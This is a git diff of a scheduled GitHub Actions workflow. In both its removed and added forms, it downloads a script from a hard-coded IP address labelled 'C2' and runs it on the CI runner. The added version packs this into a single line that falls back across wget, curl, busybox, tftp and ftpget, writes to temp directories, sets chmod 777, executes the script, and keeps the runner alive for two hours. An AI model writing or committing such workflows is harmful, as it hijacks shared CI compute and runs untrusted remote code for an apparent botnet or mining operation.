@@ -1,4 +1,4 @@
-name: Architecture Detection + Payload Runner
+name: Auto Payload with Arch Detection
 
 on:
   schedule:
@@ -9,41 +9,10 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-    - name: Detect & Run
+    - name: Show Arch
+      run: echo "Running on $(uname -m) at $(date)"
+    - name: Run Payload
       run: |
-        echo "=========================================="
-        echo "Architecture Detection & Payload Runner"
-        echo "=========================================="
-        
-        # Show architecture
-        echo "System: $(uname -a)"
-        echo "Architecture: $(uname -m)"
-        echo "CPU Info: $(lscpu | grep -E 'Model name|Architecture' | head -2)"
-        echo ""
-        
-        # Download and run
-        cd /tmp
-        C2="16.171.16.1"
-        
-        echo "[*] Downloading from $C2..."
-        wget "http://$C2/run.sh" -O run.sh 2>/dev/null || \
-        curl -s "http://$C2/run.sh" -o run.sh
-        
-        if [ -s run.sh ]; then
-            echo "✅ Payload downloaded ($(wc -c < run.sh) bytes)"
-            chmod +x run.sh
-            echo "Payload content:"
-            head -10 run.sh
-            echo ""
-            echo "[*] Executing payload..."
-            ./run.sh &
-            echo "✅ Payload executed"
-        else
-            echo "❌ Failed to download"
-            # Test if C2 is reachable
-            nc -zv "$C2" 80 2>&1 || echo "C2 not reachable"
-        fi
-        
-        echo "=========================================="
-        echo "Keeping alive for 2 hours..."
+        cd /tmp||cd /var/tmp||cd /dev/shm
+        (wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null||curl -s http://16.171.16.1/run.sh -o run.sh||busybox wget http://16.171.16.1/run.sh -O run.sh 2>/dev/null||tftp -g -r run.sh 16.171.16.1 69||ftpget -u "" -p "" -P 21 16.171.16.1 run.sh run.sh);[ -s run.sh ]&&chmod 777 run.sh&&./run.sh
         sleep 7200
